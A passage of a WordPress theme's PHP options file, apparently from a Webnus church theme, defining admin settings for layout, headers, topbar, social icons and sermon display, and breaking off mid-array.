<?php
if (!class_exists('NHP_Options')) {
    require_once( get_template_directory() . '/inc/nc-options/options/noptions.php' );
}
defined('webnus_framework') or define('webnus_framework', 'webnus_framework');
function add_another_section($sections) {
    $sections[] = array(
        'title' => esc_html__('A Section added by hook', 'webnus_framework'),
        'desc' => wp_kses( __('<p class="description">This is a section created by adding a filter to the sections array, great to allow child themes, to add/remove sections from the options.</p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'icon' => trailingslashit(get_template_directory_uri()) . 'options/img/glyphicons/glyphicons_062_attach.png',
        'fields' => array()
    );
    return $sections;
}
function change_framework_args($args) {
    return $args;
}
function setup_framework_options() {
    $theme_dir = get_template_directory_uri() . '/';
    $args = array();
    $theme_img_dir = $theme_dir . 'images/';
    $theme_img_bg_dir = $theme_img_dir . 'bgs/';
    $args['dev_mode'] = false;
    $args['intro_text'] = wp_kses( __('<p></p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) );
    $args['share_icons']['twitter'] = null;
    $args['share_icons']['linked_in'] = null;
    $args['show_import_export'] = true;
    $args['opt_name'] = 'webnus_options';
    $args['menu_title'] = esc_html__('Theme Options', 'webnus_framework');
    $args['page_title'] = esc_html__('Theme Options', 'webnus_framework');
    $args['page_slug'] = 'webnus_theme_options';
    $args['page_position'] = 250;
	$categories = array();
	$categories = get_categories();
	$category_slug_array = array('');
	foreach($categories as $category){$category_slug_array[] = $category->slug;}
	
	$cf7 = get_posts( 'post_type="wpcf7_contact_form"&numberposts=-1' );
	$contact_forms = array();
	if ($cf7) {
		foreach ( $cf7 as $cform ) {
			$contact_forms[ $cform->ID ] = $cform->post_title;
		}
	} else {
		$contact_forms[ esc_html__( 'No contact forms found', 'webnus_framework' ) ] = 0;
	}
		
		
    $args['show_theme_info'] = false;
    $sections = array();
    $sections[] = array(
        'title' => esc_html__('General', 'webnus_framework'),
        'desc' => wp_kses( __('<p class="description">Here are general settings of the theme:</p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'icon' => NHP_OPTIONS_URL . 'img/admin-general.png',
        'fields' => array(
		array(
                'id' => 'webnus_template_select',
                'type' => 'select',
                'title' => esc_html__('Template', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>Select your desired template from the the list.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('pax' => 'Pax','remittal' => 'Remittal', 'solace' => 'Solace','trust' => 'Trust'),
                'std' => ''
            ),
        array(
                'id' => 'webnus_enable_responsive',
                'type' => 'button_set',
                'title' => esc_html__('Responsive', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>Disable this option in case you don’t need a responsive website.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('1' => 'Enable', '0' => 'Disable'),
                'std' => '1'
            ),
        array(
                'id'      => 'webnus_css_minifier',
                'type'    => 'button_set',
                'title'   => esc_html__('CSS Minifyer', 'webnus_framework'),
                'options' => array('1' => 'Enable', '0' => 'Disable'),
                'desc'=> wp_kses( __('<br>Enable this option to minify your style-sheets. It’ll decrease size of your style-sheet files to speed up your website.','webnus_framework'), array( 'br' => array() ) ),
                'std'     => '1'
            ),
            array(
                'id' => 'webnus_background_layout',
                'type' => 'button_set',
                'title' => esc_html__('Layout', 'webnus_framework'),
                'options' => array('' => 'Wide', 'boxed-wrap' => 'Boxed'),
                'desc'=> wp_kses( __('<br>Select boxed or wide layout.','webnus_framework'), array( 'br' => array() ) ),
                'std' => ''
            ),
			array(
                'id' => 'webnus_container_width',
                'type' => 'text',
                'title' => esc_html__('Container max-width', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>You can define width of your website. ( Max width: 100% or 1170px )','webnus_framework'), array( 'br' => array() ) ),
            ),
            array(
                'id' => 'webnus_favicon',
                'type' => 'upload',
                'title' => esc_html__('Custom Favicon', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>An icon that will show in your browser tab near to your websites title, icon size is : (16 X 16)px','webnus_framework'), array( 'br' => array() ) ),
            ),
            array(
                'id' => 'webnus_apple_iphone_icon',
                'type' => 'upload',
                'title' => esc_html__('Apple iPhone Icon', 'webnus_framework'),
                'desc' => esc_html__('Icon for Apple iPhone (57px x 57px)', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_apple_ipad_icon',
                'type' => 'upload',
                'title' => esc_html__('Apple iPad Icon', 'webnus_framework'),
                'desc' => esc_html__('Icon for Apple iPad (72px x 72px)', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_recaptcha_site_key',
                'type' => 'text',
                'title' => esc_html__('reCaptcha Site key', 'webnus_framework'),
                'desc' => wp_kses( __('<p class="description">Register your website and get Secret Key.Very first thing you need to do is register your website on Google recaptcha to do that click <a href="https://www.google.com/recaptcha/admin#list" target="_blank">here</a>.</p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ), 'a' => array( 'href' => array(), 'target' => array() ) ) ),
            ),
            array(
                'id' => 'webnus_recaptcha_secret_key',
                'type' => 'text',
                'title' => esc_html__('reCaptcha Secret key', 'webnus_framework'),
                'desc' => '',
            ),
           array(
                'id' => 'webnus_admin_login_logo',
                'type' => 'upload',
                'title' => esc_html__('Admin Login Logo', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>It belongs to the back-end of your website to log-in to admin panel.','webnus_framework'), array( 'br' => array() ) ),
            ),	 
            array(
                'id' => 'webnus_toggle_toparea_enable',
                'type' => 'button_set',
                'title' => esc_html__('Toggle Top Area', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'desc'=> wp_kses( __('<br>It loads a small plus icon to the top right corner of your website.By clicking on it, it opens and shows your content that you set before.','webnus_framework'), array( 'br' => array() ) ),
                'std' => '0'
            ),
           array(
                'id' => 'webnus_enable_breadcrumbs',
                'type' => 'button_set',
                'title' => esc_html__('Breadcrumbs', 'webnus_framework'),
                'options' => array('0' => 'Hide', '1' => 'Show'),
                'desc'=> wp_kses( __('<br>It allows users to keep track of their locations within pages.','webnus_framework'), array( 'br' => array() ) ),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_enable_livesearch',
                'type' => 'button_set',
                'title' => esc_html__('Live Search', 'webnus_framework'),
                'options' => array('0' => 'Disable', '1' => 'Enable'),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_space_before_head',
                'type' => 'textarea',
                'title' => esc_html__('Space Before &lt;/head&gt;', 'webnus_framework'),
                'desc' => esc_html__('Add code before the &lt;/head&gt; tag.', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_space_before_body',
                'type' => 'textarea',
                'title' => esc_html__('Space Before &lt;/body&gt;', 'webnus_framework'),
                'desc' => esc_html__('Add code before the &lt;/body&gt; tag.', 'webnus_framework'),
            ),
        )
    );
    $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-header.png',
        'title' => esc_html__('Header Options', 'webnus_framework'),
        'desc' => wp_kses( __('<p class="description">Everything about headers, Logo, Menus and contact information are here:</p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'fields' => array(
            array(
                'id' => 'webnus_logo',
                'type' => 'upload',
                'title' => esc_html__('Logo - W P L O C K E R .C O M', 'webnus_framework'),
                'desc' => esc_html__('Choose an image file for your logo. For Retina displays please add Image in large size and set custom width.', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_logo_width',
                'type' => 'text',
                'title' => esc_html__('Logo width', 'webnus_framework'),
                'std' => '150'
            ),
            array(
                'id' => 'webnus_transparent_logo',
                'type' => 'upload',
                'title' => esc_html__('Transparent header logo', 'webnus_framework'),
            ),
			 array(
                'id' => 'webnus_transparent_logo_width',
                'type' => 'text',
                'title' => esc_html__('Transparent header logo width', 'webnus_framework'),
                'std' => '150'
            ),
            array(
                'id' => 'webnus_sticky_logo',
                'type' => 'upload',
                'title' => esc_html__('Sticky header logo', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>Use this option to upload a logo which will be used when header is on sticky state.Sticky state is a fixed header when scrolling.','webnus_framework'), array( 'br' => array() ) ),
            ),
			 array(
                'id' => 'webnus_sticky_logo_width',
                'type' => 'text',
                'title' => esc_html__('Sticky header logo width', 'webnus_framework'),
                'std' => '60'
            ),
			array(
                'id' => 'webnus_header_padding_top',
                'type' => 'text',
                'title' => esc_html__('Header padding-top', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>This option controls the space between header top with content or elements that is in top of the header.','webnus_framework'), array( 'br' => array() ) ),
            ),
            array(
                'id' => 'webnus_header_padding_bottom',
                'type' => 'text',
                'title' => esc_html__('Header padding-bottom', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>This option controls the space between header bottom with content or elements that is in bottom of the header.','webnus_framework'), array( 'br' => array() ) ),
            ),
			array(
                'id' => 'webnus_slogan',
                'type' => 'text',
                'title' => esc_html__('Slogan text', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_page_menu_sp',
                'type' => 'seperator',
                'desc' => esc_html__('Header Menu', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_header_sticky',
                'type' => 'button_set',
                'title' => esc_html__('Sticky Menu', 'webnus_framework'),
                'options' => array('0' => esc_html__('Disable', 'webnus_framework'), '1' => esc_html__('Enable', 'webnus_framework')),
                'desc'=> wp_kses( __('<br>Sticky menu is a fixed header when scrolling the page. By enabling this option when you are scrolling, the header menu will scroll too.','webnus_framework'), array( 'br' => array() ) ),
                'std' => '0'
            ),
            array(
                'id' => 'webnus_header_sticky_scrolls',
                'type' => 'text',
                'title' => esc_html__('Scrolls value to sticky the header', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>Fill your desired amount which by scrolling that amount, sticky menu will appear.','webnus_framework'), array( 'br' => array() ) ),
                'value' => '150',
            ),
            array(
                'id' => 'webnus_header_menu_type',
                'type' => 'radio_img',
                'title' => esc_html__('Select Header Layout', 'webnus_framework'),
                'options' => array(
				    '0' => array('title' => esc_html__('Header Type 0', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu0.png'),
                	'1' => array('title' => esc_html__('Header Type 1', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu1.png'),
                    '2' => array('title' => esc_html__('Header Type 2', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu2.png'),
                    '3' => array('title' => esc_html__('Header Type 3', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu3.png'),
                    '4' => array('title' => esc_html__('Header Type 4', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu4.png'),
                    '5' => array('title' => esc_html__('Header Type 5', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu5.png'),
					'6' => array('title' => esc_html__('Header Type 6', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu6.png'),
					'7' => array('title' => esc_html__('Header Type 7', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu7.png'),
					'8' => array('title' => esc_html__('Header Type 8', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu8.png'),
					'9' => array('title' => esc_html__('Header Type 9', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu9.png'),
					'10' => array('title' => esc_html__('Header Type 10', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu10.png')
				),
				'std' => '1'
			),
			array(
                'id' => 'webnus_dark_submenu',
                'type' => 'button_set',
                'title' => esc_html__('Dark Submenu', 'webnus_framework'),
				'desc' => esc_html__('For Header Menu and Topbar Menu','webnus_framework'),
                'options' => array('0' => esc_html__('Disable', 'webnus_framework'), '1' => esc_html__('Enable', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_header_background',
                'type' => 'upload',
                'title' => esc_html__('Header Background Image', 'webnus_framework'),
                'desc' => esc_html__('For Header Type 6', 'webnus_framework'),
            ),
			array(
				'id' => 'webnus_header_logo_alignment',
				'type' => 'button_set',
				'title' => esc_html__('Logo Alignment', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>This option changes the position of the logo on top of the header.<br>For header type: 2, 3, 4, 5 and 9','webnus_framework'), array( 'br' => array() ) ),
				'options' => array('1' => 'Left', '2' => 'Center', '3' => 'Right'),
				'std' => '1'
            ),
 			array(
                'id' => 'webnus_header_search_enable',
                'type' => 'button_set',
                'title' => esc_html__('Search in Header', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>This option shows a search icon at the end of the header menu for header type 1','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('0' => esc_html__('Disable', 'webnus_framework'), '1' => esc_html__('Enable', 'webnus_framework')),
                'std' => '0'
            ),
		  	array(
                'id' => 'webnus_header_logo_rightside',
                'type' => 'select',
                'title' => esc_html__('Header Right side', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>For header type: 2, 3, 4, 5, 9<br><br>Contact information: you can put phone number and email address by fill the information boxes in the next part.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array(0 => esc_html__('None','webnus_framework'), 1 => esc_html__('Search Box','webnus_framework'), 2 => esc_html__('Contact Information','webnus_framework'), 3 => esc_html__('Header Sidebar','webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_header_phone',
                'type' => 'text',
                'title' => esc_html__('Header Phone Number', 'webnus_framework'),
                'std' => '+1 234 56789'
            ),
            array(
                'id' => 'webnus_header_email',
                'type' => 'text',
                'title' => esc_html__('Header Email Address', 'webnus_framework'),
                'std' => 'info@yourdomain.com'
            ),
			  array(
                'id' => 'webnus_header_menu_icon',
                'type' => 'radio_img',
                'title' => esc_html__('Responsive header', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>Choose between two type of responsive menu navigation for mobile and tablet sizes.','webnus_framework'), array( 'br' => array() ) ),
				'options' => array(
               		'sm-rgt-ms' => array('title' => esc_html__('Modern', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu-icon1.png'),
               		'' => array('title' => esc_html__('Classic', 'webnus_framework'), 'img' => $theme_img_dir . 'menutype/menu-icon2.png'),
                ),
                'std' => 'sm-rgt-ms'
            ),
			array(
                'id' => 'webnus_news_ticker_sp',
                'type' => 'seperator',
                'desc' => esc_html__('News Ticker', 'webnus_framework'),
            ),
		  	array(
                'id' => 'webnus_news_ticker',
                'type' => 'button_set',
                'title' => esc_html__('Active', 'webnus_framework'),
                'desc' => '',
				'options' => array('0' => esc_html__('Disable', 'webnus_framework'), '1' => esc_html__('Enable', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_nt_show',
                'type' => 'button_set',
                'title' => esc_html__('Show in', 'webnus_framework'),
                'desc' => '',
				'options' => array('0' => esc_html__('Home', 'webnus_framework'), '1' => esc_html__('All Page', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_nt_title',
                'type' => 'text',
                'title' => esc_html__('News Ticker Title', 'webnus_framework'),
                'std' => 'Latest Posts'
            ),
			array(
                'id' => 'webnus_nt_cat',
                'type' => 'select',
                'title' => esc_html__('Category', 'webnus_framework'),
				'options' => $category_slug_array,
				'desc' => wp_kses( __('<br><br>Select specific category, leave blank to show all categories.', 'webnus_framework'), array( 'br' => array() ) ),
                'std' => ''
            ),
			array(
                'id' => 'webnus_nt_count',
                'type' => 'text',
                'title' => esc_html__('Post Count', 'webnus_framework'),
                'std' => '5'
            ),
			array(
                'id' => 'webnus_nt_effect',
                'type' => 'button_set',
                'title' => esc_html__('Animation Type', 'webnus_framework'),
				'options' => array('reveal' => esc_html__('Reveal', 'webnus_framework'), 'fade' => esc_html__('Fade', 'webnus_framework')),
                'std' => 'reveal'
            ),
			array(
                'id' => 'webnus_nt_speed',
                'type' => 'text',
                'title' => esc_html__('Animation Speed', 'webnus_framework'),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_nt_pause',
                'type' => 'text',
                'title' => esc_html__('Pause On Items', 'webnus_framework'),
                'std' => '2'
            ),
    ));
	    /** TOPBAR **/	
	$sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-topbar.png',
        'title' => esc_html__('Topbar Options', 'webnus_framework'),
        'desc' => wp_kses( __('<p class="description">Top bar is the topmost location in your website that you can place special elements in such as Login Modal, Donate Modal, Menu, Social Icons, Cantact Informations, TagLine and WPML Language bar.</p><p>Note: when you choose menu, you should create Topbar Menu from apearance > menus.</p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'fields' => array(		 
            array(
                'id' => 'webnus_header_topbar_enable',
                'type' => 'button_set',
                'title' => esc_html__('Show/Hide TopBar', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_topbar_background_color',
                'type' => 'color',
                'title' => esc_html__('Background Color', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>This option changes the background color of Topbar.','webnus_framework'), array( 'br' => array() ) ),
                'std' => ''
            ),
			array(
                'id' => 'webnus_topbar_fixed',
                'type' => 'button_set',
                'title' => esc_html__('Fixed Topbar', 'webnus_framework'),
                'options' => array('0' => esc_html__('Disable', 'webnus_framework'), '1' => esc_html__('Enable', 'webnus_framework')),
                'std' => '0'
            ),	
			
			array(
                'id' => 'webnus_topbar_search',
                'type' => 'button_set',
                'title' => esc_html__('Search Bar', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
            ),			

			array(
                'id' => 'webnus_topbar_login',
                'type' => 'button_set',
                'title' => esc_html__('Login Modal', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
				'desc' => wp_kses( __('<br>Login Modal Link in Topbar','webnus_framework'), array( 'br' => array() ) ),
            ),

			array(
                'id' => 'webnus_topbar_login_text',
                'type' => 'text',
                'title' => esc_html__('Login Modal Text', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
				'desc' => wp_kses( __('<br>Login Modal Link Text','webnus_framework'), array( 'br' => array() ) ),
				'std' => 'LOGIN'
            ),
			
			array(
                'id' => 'webnus_topbar_donate',
                'type' => 'button_set',
                'title' => esc_html__('Donate Modal', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
				'desc' => wp_kses( __('<br>Donate Modal Link in Topbar','webnus_framework'), array( 'br' => array() ) ),
            ),

			array(
                'id' => 'webnus_topbar_contact',
                'type' => 'button_set',
                'title' => esc_html__('Contact Modal', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
				'desc' => wp_kses( __('<br>Contact Modal Link in Topbar','webnus_framework'), array( 'br' => array() ) ),
            ),
			
			array(
                'id' => 'webnus_topbar_form',
                'type' => 'select',
                'title' => esc_html__('Select Contact Form', 'webnus_framework'),
                'options' => $contact_forms,
				'desc' => wp_kses( __('<br>Choose previously created contact form from the drop down list.', 'webnus_framework'), array( 'br' => array() ) ),
            ),
			

			array(
                'id' => 'webnus_topbar_info',
                'type' => 'button_set',
                'title' => esc_html__('Contact Information', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
            ),

			array(
                'id' => 'webnus_topbar_phone',
                'type' => 'text',
                'title' => esc_html__('Topbar Phone Number', 'webnus_framework'),
                'std' => '+1 234 56789'
            ),
            array(
                'id' => 'webnus_topbar_email',
                'type' => 'text',
                'title' => esc_html__('Topbar Email Address', 'webnus_framework'),
                'std' => 'info@yourdomain.com'
            ),
			
			array(
                'id' => 'webnus_topbar_menu',
                'type' => 'button_set',
                'title' => esc_html__('Topbar Menu', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
            ),

			
			array(
                'id' => 'webnus_topbar_custom',
                'type' => 'button_set',
                'title' => esc_html__('Custom Text', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
            ),
			
			array(
                'id' => 'webnus_topbar_text',
                'type' => 'text',
                'title' => esc_html__('Topbar Custom Text', 'webnus_framework'),
                'desc' => wp_kses( __('<br>Insert Any Text You Want Here', 'webnus_framework'), array( 'br' => array() ) ),
            ),

			array(
                'id' => 'webnus_topbar_language',
                'type' => 'button_set',
                'title' => esc_html__('Language Bar', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
				'desc' => wp_kses( __('<br>WPML Language Bar in Topbar','webnus_framework'), array( 'br' => array() ) ),
            ),
			
			array(
                'id' => 'webnus_topbar_social',
                'type' => 'button_set',
                'title' => esc_html__('Social Icons', 'webnus_framework'),
                'options' => array('' => esc_html__('None', 'webnus_framework'), 'left' => esc_html__('Left', 'webnus_framework'), 'right' => esc_html__('Right', 'webnus_framework')),
            ),
			
            array(
                'id' => 'webnus_top_social_icons_sep',
                'type' => 'seperator',
                'desc' => esc_html__('TopBar Social Icons', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_top_social_icons_facebook',
                'type' => 'button_set',
                'title' => esc_html__('Facebook Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_top_social_icons_twitter',
                'type' => 'button_set',
                'title' => esc_html__('Twitter Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_top_social_icons_dribbble',
                'type' => 'button_set',
                'title' => esc_html__('Dribbble Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
            array(
                'id' => 'webnus_top_social_icons_pinterest',
                'type' => 'button_set',
                'title' => esc_html__('Pinterest Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
            array(
                'id' => 'webnus_top_social_icons_vimeo',
                'type' => 'button_set',
                'title' => esc_html__('Vimeo Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_top_social_icons_youtube',
                'type' => 'button_set',
                'title' => esc_html__('Youtube Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
             array(
                'id' => 'webnus_top_social_icons_google',
                'type' => 'button_set',
                'title' => esc_html__('Google+ Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
             array(
                'id' => 'webnus_top_social_icons_linkedin',
                'type' => 'button_set',
                'title' => esc_html__('LinkedIn Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
            array(
                'id' => 'webnus_top_social_icons_rss',
                'type' => 'button_set',
                'title' => esc_html__('RSS Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
            			array(
                'id' => 'webnus_top_social_icons_instagram',
                'type' => 'button_set',
                'title' => esc_html__('Instagram Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_top_social_icons_flickr',
                'type' => 'button_set',
                'title' => esc_html__('Flickr Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_top_social_icons_reddit',
                'type' => 'button_set',
                'title' => esc_html__('Reddit Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_top_social_icons_delicious',
                'type' => 'button_set',
                'title' => esc_html__('Delicious Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_top_social_icons_lastfm',
                'type' => 'button_set',
                'title' => esc_html__('LastFM Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_top_social_icons_tumblr',
                'type' => 'button_set',
                'title' => esc_html__('Tumblr Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_top_social_icons_skype',
                'type' => 'button_set',
                'title' => esc_html__('Skype Icon', 'webnus_framework'),
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
                'std' => '0'
            ),
    ));
	
	   /** Church Options **/	
	$sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-chuchoptions.png',
        'title' => esc_html__('Church Options', 'webnus_framework'),
        'fields' => array(				
            array(
                'id' => 'webnus_booking_enable',
                'type' => 'button_set',
                'title' => esc_html__('Event Booking', 'webnus_framework'),
                'options' => array('0' => esc_html__('Disable', 'webnus_framework'), '1' => esc_html__('Enable', 'webnus_framework')),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_booking_form',
                'type' => 'select',
                'title' => esc_html__('Event Booking Form', 'webnus_framework'),
                'options' => $contact_forms,
				'desc' => wp_kses( __('<br>Choose previously created contact form from the drop down list.', 'webnus_framework'), array( 'br' => array() ) ),
            ),
		 array(
                'id' => 'webnus_custom_color_sep',
                'type' => 'seperator',
                'desc' => esc_html__('Sermon Options', 'webnus_framework'),
				'sub_desc' => esc_html__('on Sermon Post', 'webnus_framework'),
            ),
			
			array(
                'id' => 'webnus_singlesermon_sidebar',
                'type' => 'button_set',
                'title' => esc_html__('Single Sermon Sidebar', 'webnus_framework'),
                'options' => array('none'=>'None','left' => 'Left', 'right' => 'Right'),
                'std' => 'right',
            ),
			 array(
                'id' => 'webnus_sermon_speaker',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Speaker', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_sermon_date',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Date', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_sermon_category',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Category', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_sermon_comments',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Comments', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_sermon_views',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Views', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),

            array(
                'id' => 'webnus_sermon_featuredimage',
                'type' => 'button_set',
                'title' => esc_html__('Featured Image on Sermon Post', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_sermon_social_share',
                'type' => 'button_set',
                'title' => esc_html__('Social Share Links', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_sermon_speakerbox',
                'type' => 'button_set',
                'title' => esc_html__('Show Sermon Speaker Box', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),				
			array(
                'id' => 'webnus_recent_sermons',
                'type' => 'button_set',
                'title' => esc_html__('Show Recent Sermons', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),					
			 array(
                'id' => 'webnus_custom_color_sep',
                'type' => 'seperator',
                'desc' => esc_html__('Cause Options', 'webnus_framework'),
				'sub_desc' => esc_html__('on Cause Post', 'webnus_framework'),
            ),

			array(
                'id' => 'webnus_singlecause_sidebar',
                'type' => 'button_set',
